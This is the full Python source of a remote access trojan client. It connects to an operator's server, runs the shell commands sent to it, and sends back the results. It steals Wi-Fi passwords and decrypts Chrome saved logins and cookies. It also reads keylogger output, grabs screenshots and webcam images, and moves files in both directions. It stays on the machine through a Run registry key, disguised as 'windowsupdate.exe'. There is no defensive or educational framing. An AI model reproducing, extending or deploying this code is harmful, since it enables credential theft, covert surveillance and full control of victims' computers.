import socket
import subprocess
import os
import base64
import simplejson
from modules import key
import threading
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
from PIL import ImageGrab
import cv2
import sys
import time


class Client:
    def __init__(self, host, port):
        self.socket_connection = socket.socket() #Creating socket object.
        self.socket_connection.connect((host, port)) #Connecting to server.
        self.key_file = os.environ["appdata"] + "\\windowslog.txt"
        self.screen_file = os.environ["appdata"] + "\\windowsscreen.png"
        self.camera_file = os.environ["appdata"] + "\\windowsupdate.png"
        self.persistence_file = os.environ["appdata"] + "\\windowsupdate.exe"
        key_thread = threading.Thread(target=key.key_start)
        key_thread.start()

    def send_json(self, data):
        json_data = simplejson.dumps(data)
        self.socket_connection.send(json_data.encode("utf-8"))

    def get_json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.socket_connection.recv(1048576).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def execute_command(self, command):
        command_output = subprocess.check_output(command, shell=True)
        return command_output.decode("Latin1")

    def get_file(self, file_name):
        with open(file_name, "rb") as file:
            return base64.b64encode(file.read())

    def save_file(self, file_name, file_content):
        with open(file_name, "wb") as file:
            file.write(base64.b64decode(file_content))
            return "The file uploaded to target computer successfully."

    def change_directory(self, path):
        os.chdir(path)
        return "Successfully changed directory :" + path

    def pwd(self):
        return os.getcwd()

    def create_directory(self, directory_name):
        os.mkdir(directory_name)
        return "Directory created successfully."

    def remove_directory(self, directory_name):
        os.rmdir(directory_name)
        return "Directory removed successfully."

    def remove_file(self, file_name):
        os.remove(file_name)
        return "File removed successfully."

    def rename(self, old_name, new_name):
        os.rename(old_name, new_name)
        return "Directory renamed successfully."

    def get_system_info(self):
        if os.name == "nt":
            system_info = subprocess.check_output("systeminfo", shell=True).decode("Latin1")
            return system_info
        elif os.name == "posix":
            system_info = os.system("uname -a")
            return system_info

    def get_wifi(self):
        wifis = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("Latin1")
        wifi = wifis.split("\n")
        wifi_profiles = [i.split(":")[1][1:-1] for i in wifi if "All User Profile" in i]
        wifi_profile = " ".join(wifi_profiles)
        command_output = "Wifi networks :\n\n\n"
        command_output += wifi_profile + "\n\n\n"
        command_output += "Wifi passwords(in order of) :\n\n"
        for i in wifi_profiles:
            try:
                wifi_passwords = subprocess.check_output(["netsh", "wlan", "show", "profile", i, "key=clear"]).decode("Latin1").split("\n")
                wifi_passwords = [b.split(":")[1][1:-1] for b in wifi_passwords if "Key Content" in b]
                wifi_password = " ".join(wifi_passwords)
                if wifi_password == "":
                    wifi_password = "no-password"
                command_output += "\t" + wifi_password
            except subprocess.CalledProcessError:
                command_output = "An error occurred."
        return command_output

    def read_keys(self):
        with open(self.key_file, "r", encoding="utf-8") as file:
            return file.read()

    def get_chrome_datetime(self, chrome_date):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)

    def get_encryption_key(self):
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = simplejson.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self, password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    def get_browser_passwords(self):
        self.browser_data = ""
        key = self.get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        file_name = os.environ["appdata"] + "\\windows.db"
        if not os.path.isfile(file_name):
            shutil.copyfile(db_path, file_name)
        db = sqlite3.connect(file_name)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = self.decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                if self.browser_data == "":
                    self.browser_data = "Origin URL:" + origin_url + "\n"
                    self.browser_data += "Action URL:" + action_url + "\n"
                    self.browser_data += "Username:" + username + "\n"
                    self.browser_data += "Password:" + password + "\n"
                else:
                    self.browser_data += "Origin URL:" + origin_url + "\n"
                    self.browser_data += "Action URL:" + action_url + "\n"
                    self.browser_data += "Username:" + username + "\n"
                    self.browser_data += "Password:" + password + "\n"
            else:
                continue
            if date_created != 86400000000 and date_created:
                self.browser_data += "Creation Date:" + str(self.get_chrome_datetime(date_created)) + "\n"
            if date_last_used != 86400000000 and date_last_used:
                self.browser_data += "Last Used:" + str(self.get_chrome_datetime(date_last_used)) + "\n"
            self.browser_data += "=" * 50 + "\n"
        cursor.close()
        db.close()
        return self.browser_data

    def get_browser_cookies(self):
        self.browser_cookie = ""
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
        file_name = os.environ["appdata"] + "\\windows_database.db"
        if not os.path.isfile(file_name):
            shutil.copyfile(db_path, file_name)
        db = sqlite3.connect(file_name)
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()
        cursor.execute("""
            SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
            FROM cookies""")
        key = self.get_encryption_key()
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = self.decrypt_password(encrypted_value, key)
            else:
                decrypted_value = value
            self.browser_cookie += f"""
               Host: {host_key}
               Cookie name: {name}
               Cookie value (decrypted): {decrypted_value}
               Creation datetime (UTC): {self.get_chrome_datetime(creation_utc)}
               Last access datetime (UTC): {self.get_chrome_datetime(last_access_utc)}
               Expires datetime (UTC): {self.get_chrome_datetime(expires_utc)}
               ===============================================================
               """
            cursor.execute("""
               UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
               WHERE host_key = ?
               AND name = ?""", (decrypted_value, host_key, name))
        db.commit()
        db.close()
        cookie_file = os.environ["appdata"] + "\\windows_data.txt"
        with open(cookie_file, "a") as file:
            file.write(self.browser_cookie)
        return self.get_file(cookie_file)

    def get_screen(self):
        ImageGrab.grab().save(self.screen_file)
        screen_data = self.get_file(self.screen_file)
        os.remove(self.screen_file)
        return screen_data

    def get_camera(self):
        camera = cv2.VideoCapture(0)
        result, image = camera.read()
        if result:
            cv2.imwrite(self.camera_file, image)
            image_data = self.get_file(self.camera_file)
            os.remove(self.camera_file)
            return image_data
        else:
            return "Can't access to camera."

    def get_persistence(self):
        if os.path.exists(self.persistence_file):
            return "Persistence already activated."
        else:
            shutil.copyfile(sys.executable, self.persistence_file)
            regedit_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsupdate /t REG_SZ /d " + self.persistence_file
            subprocess.call(regedit_command, shell=True)
            return "Persistence activated."

    def remove_persistence(self):
        if os.path.exists(self.persistence_file):
            regedit_command = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsupdate /f"
            subprocess.call(regedit_command, shell=True)
            os.remove(self.persistence_file)
            return "Persistence deactivated."
        else:
            return "Persistence already deactivated."


    def client_main(self):
        while True:
            command = self.get_json()
            try:
                if command[0] == "cd" and len(command) > 1:
                    command_output = self.change_directory(command[1])
                elif command[0] == "get_file":
                    command_output = self.get_file(command[1])
                elif command[0] == "send_file":
                    command_output = self.save_file(command[1], command[2])
                elif command[0] == "pwd":
                    command_output = self.pwd()
                elif command[0] == "mkdir":
                    command_output = self.create_directory(command[1])
                elif command[0] == "rmdir":
                    command_output = self.remove_directory(command[1])
                elif command[0] == "rm":
                    command_output = self.remove_file(command[1])
                elif command[0] == "rename":
                    command_output = self.rename(command[1], command[2])
                elif command[0] == "system_info":
                    command_output = self.get_system_info()
                elif command[0] == "get_wifi":
                    command_output = self.get_wifi()
                elif command[0] == "read_keys":
                    command_output = self.read_keys()
                elif command[0] == "save_keys":
                    command_output = self.get_file(self.key_file)
                    os.remove(self.key_file)
                elif command[0] == "get_browser_passwords":
                    command_output = self.get_browser_passwords()
                elif command[0] == "get_browser_cookies":
                    command_output = self.get_browser_cookies()
                elif command[0] == "get_screen":
                    command_output = self.get_screen()
                elif command[0] == "get_camera":
                    command_output = self.get_camera()
                elif command[0] == "get_persistence":
                    command_output = self.get_persistence()
                elif command[0] == "remove_persistence":
                    command_output = self.remove_persistence()
                else:
                    command_output = self.execute_command(command)
            except Exception:
                command_output = "Unknown command.For command list, use 'help' command."

            self.send_json(command_output)


def get_persistence():
    persistence_file = os.environ["appdata"] + "\\windowsupdate.exe"
    regedit_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsupdate /t REG_SZ /d " + persistence_file
    if not os.path.exists(persistence_file):
        shutil.copyfile(sys.executable, persistence_file)
        subprocess.call(regedit_command, shell=True)
    else:
        pass

